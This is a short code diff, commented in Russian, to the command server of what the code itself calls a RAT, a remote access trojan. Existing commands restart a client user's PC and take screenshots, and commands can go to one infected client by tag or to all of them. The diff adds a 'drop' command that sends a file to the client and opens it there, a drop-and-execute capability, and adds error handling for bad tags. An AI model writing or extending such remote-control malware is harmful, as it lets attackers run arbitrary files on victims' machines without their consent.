@@ -12,6 +12,7 @@ commands = [
     ["restart", "Restarts the client users PC"],
     ["ratHelp", "Displays this list"],
     ["screen", "makes screenshot"],
+    ["drop", "отправляет файл и открывает его на клиенте"],
 ]
 
 # выводит список доступных команд
@@ -62,7 +63,7 @@ class ManyServers:
         return s
     
     async def make_command_to_server(self, command):
-        """Создание запроса к клиенту или клиентам по тегу. Если тег = all, отправляет запрос всем клиентам"""
+        """Создание запроса к клиенту(ам) по тегу. Если тег = all, отправляет запрос всем клиентам"""
         # @todo many tags
         # извлечение тега из сообщения
         tag = command.split()[0]
@@ -76,7 +77,10 @@ class ManyServers:
                     continue
                 res.append(i.step(command.split()[1:]))
             return res
-        tag = int(tag)
+        try:
+            tag = int(tag)
+        except ValueError:
+            return "incorrect tag"
         # проверка наличия подключения с полученным тегом
         if self.__servers_ips.get(tag, "no") == "no":
             return f"exist not connection with name: {tag}"
